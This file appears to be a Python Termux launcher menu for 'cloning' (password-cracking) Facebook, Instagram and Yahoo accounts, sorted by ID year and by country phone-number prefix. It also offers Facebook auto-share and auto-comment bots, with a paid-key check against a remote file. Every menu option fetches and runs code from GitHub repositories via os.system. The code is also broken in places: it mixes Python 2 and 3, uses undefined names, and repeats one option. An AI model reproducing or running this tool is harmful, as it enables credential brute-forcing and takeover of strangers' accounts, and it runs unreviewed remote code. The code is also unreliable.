import requests

from requests.structures import CaseInsensitiveDict

import os

import sys

import time

os.system("pip install requests")
#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
#originally written (IMTIAZ ALI ARADIN)
import os, time, uuid, requests
try:
	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests")

agents = [
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
]
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
logo = '33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m\n \033[0m================================================================\n\33[93mAUTHOR :\033[91m[MAHDI HASAN] SHUVO\n\033[0;33mGITHUB : \033[1;97mhttps://github.com/MAHDI-Shuvo\nLIVE in Sylhet (Read in class 10)\n\033[42mNo NEED GF \033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU\n ==============================================================='
print("""\033[1;91m-----------------------------------------------------
 \033[1;91m(*)\033[1;95m Developer: ◠◡♥♥  MAHDI HASAN   ♥♥◡◠
 \033[1;92m(*)\033[1;94m Facebook : ◠◡♥♥ MAHDI HASAN (SHUVO) ♥♥◡◠
 \033[1;93m(*)\033[1;93m Github   : ◠◡♥♥  MAHDI-Shuvo   ♥♥◡◠
 \033[1;97m(*)\033[1;96m Helper   : ◠◡♥♥ OWN ♥♥◠◡
 \033[1;94m(*)\033[1;92m
 \033[1;95m(*)\033[1;91m  ✯ 🅐︎🅡︎🅐︎🅓︎🅘︎🅝︎ Ⓚ︎Ⓘ︎Ⓝ︎Ⓖ︎ 🅑︎🅞︎🅛︎🅣︎🅔︎ Ⓟ︎Ⓤ︎Ⓑ︎Ⓛ︎Ⓘ︎Ⓒ︎ ✯
\033[1;91m-----------------------------------------------------
""")
def main_apv():
    imt=" -mahdi"
    os.system('clear')
    print logo
    try:
        key1=open("/sdcard/imt.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
        print ("You dont have subscrption")
        print ("Hello Dear Ya Cammonds Paid Han Or Ap Ke Subscription Nhi Ha Please Ap Admin Sa Rabta Kran Thanks")
        print (" Subscription Kelya Enter Press Kro Or Whatsapp Pa Rabta Kro Thanks")
        myid=uuid.uuid4().hex[:8]
        print ("Your key : "+MYID+IMT)
        print ("jo mrzi likh lena")
        kok=open("/sdcard/imt.txt",'w')
        kok.write(MYID+IMT)
        kok.close()
        raw_input("press enter go to admin")
        os.system("xdg-open https://wa.me/+8801887408882")

    r1=requests.get("https://raw.githubusercontent.com/MAHDI-Shuvo/maprove/main/mahdi.text").text
    if key1 in r1:
        tool()
    else:
        os.system("clear")
        print logo
        print ("You dont have subscrption")
        print ("Hello Dear This Cammonds is Paid ,So friest toy need premishon on the admin Thank you all")
        print (" Subscription Kelya Enter Press Or contract Whatsapp   Thanks ypu all")
        print ("Your key : "+key1)
        print ("jo mrzi likh lena")
        raw_input("Agar Ap Na Subscription Kar Le Ha To Termux Sa Exit Kar Ka Phir Sa Cammonds Lagio Thanks")
        os.system("xdg-open https://wa.me/+8801887408882")
os.system("clear")


print("""\33[93m███╗   ███╗ █████╗██╗  ██╗██████╗ ██╗     \n\033[91m███╗ ████║██╔══██╗██║  ██║██╔══██╗██║    \n\033[1;32m██╔████╔██║███████║███████║██║  ██║██║   \n\33[97m██║╚██╔╝██║██╔══██║██╔══██║██║  ██║██║    \n\033[96m██║ ╚═╝ ██║██║  ██║██║  ██║██████╔╝██║    \n\033[0;35m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝\033[0m 
\033[0m================================================================
\33[93mAUTHOR :\033[91m[MAHDI HASAN] SHUVO
\033[0;33mGITHUB : \033[1;97mhttps://github.com/====
\033[1;31mFb ; https://web.facebook.com/mahdihasan.80
\033[1;33mLIVE in Sylhet (Read in class 10)
\033[42mNo NEED GF \033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU 
\033[0;36m================================================================""")
print("""
\033[1;36m[1]CLONE FROM2006- 2009 ID
\033[1;32m[2]CLONE FROM 2009 ID 
\033[1;88m[3]CLONE FROM 2010-2020 ID
\033[1;33m[4]CLONE FROM  BANGLADESH 6DIG[All SIM]
\033[1;32m[5]CLONE FROM INSTRAGAM ID
\033[1;33m[6]CLONE FROM FRIENDLIST (NEED TOKEN)
\033[1;36m[7]CLONE FROM  PUBLICK ID v2
\033[1;32m[8]CLONE FROM ID BANGLADESH 11DIG[All SIM]
\033[1;33m[9]CLONE FROM NUMBER BD
\033[1;88m[10]CLONE FROM FREOM PAKISTAN 
\033[1;88m[11]CLONE FROM FROM INDIA
\033[0;33m[12]CLONE FROM AFGHANISTAN 
\033[0;88m[13]CLONE FROM FREOM PAKISTAN V2(All SIM)
\033[1;33m[14]CLONE FROM FREOM File Creating
\033[1;35m[15]CLONE FROM LATEST FB CRACKING LOGIN
\033[1;33m[16]CLONE FROM ID BANGLADESH 9DIG (All SIM)
\033[1;32m[17]CLONE FROM 2009 ID [MAO]
\033[1;37m[18]FB AUTO SHARE (need TOKEN)
\033[1;33m[19]FB AUTO COMMENT(need TOKEN)
\033[1;33m[20]CLONE YAHOO 
\033[1;36m[21]CLONE FROM  PUBLICK ID  (Best) v2
\033[1;36m[22]CLONE FROM  PUBLICK ID  (best) v2
\033[1;33m[23]CLONE FROM FREOM File Creating V
\033[1;36m[24]CLONE FROM2003- 2005 ID
""")
pil = input("\033[1;97m[\033[1;94m?\033[1;97m] CHOOSE: ")

if pil in ["01", "1"]:

    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python2 mahdi9.py')
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["02", "2"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python 20091st.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()



elif pil in ["03", "3"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python2 pakistan.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["04", "4"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python2 BD6.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()



elif pil in ["05", "5"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && python instragam.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["06", "6"]:
    os.system('pkg install nodejs -y && pip install requests bs4 futures mechanize && rm -rf qurat && git clone https://github.com/Qurat677/qurat.git && cd qurat')
    os.system('python Nx.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["07", "7"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python Prem.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["08", "8"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python2 BD11.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["09", "9"]:
    os.system('git clone https://github.com/Azim-vau/smbf.git && cd smbf')
    os.system('python2 smbf.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["10"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4 && python2 pakistan.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
	
	
elif pil in ["11"]:
    os.system('pkg update ; pkg upgrade ; pkg install python ; pkg install python2 ; pip2 install requests ; pip2 install mechanize ; pip2 install bs4 ; pkg install git ; git clone https://github.com/Azim-vau/clone-india.git ; cd clone-india ; python2 india.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	
elif pil in ["12"]:

    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4 && python2 Mahadi-Afg.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["13"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python mahdi2.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["14"]:
    os.system('git clone https:/github.com/James404-cyber/DUM-ID.git')
    os.system('cd DUM-ID && python Doubled.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["15"]:
    os.system('pkg install nodejs -y && pip install requests bs4 futures mechanize && rm -rf qurat && git clone https://github.com/Qurat677/qurat.git && cd qurat')
    system('python Nx.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    
elif pil in ["16"]:
    os.system('git clone https://github.com/Shuvo-BBHH/shuvook.git && cd shuvook && python2 bd9.py cvx')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["17"]:
    os.system('pip2 install mclone')
    os.system('mclone')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["18"]:
    os.system('git clone https://github.com/Shuvo-BBHH/fbboT && cd fbboT && python mahdi.py')
    
elif pil in ["19"]:
    os.system('git clone https://github.com/Shuvo-BBHH/fbboT && cd fbboT && python autocomment.py')
  
	
elif pil in ["20"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs && python yahoo.py')	

elif pil in ["20"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs && python ')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	

elif pil in ["21"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall && cd mall && python Adf.py ')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
	
elif pil in ["22"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall && cd mall && python Juttbrand.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	
elif pil in ["23"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall && cd mall && python2 file.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["24"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs && python2 811.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
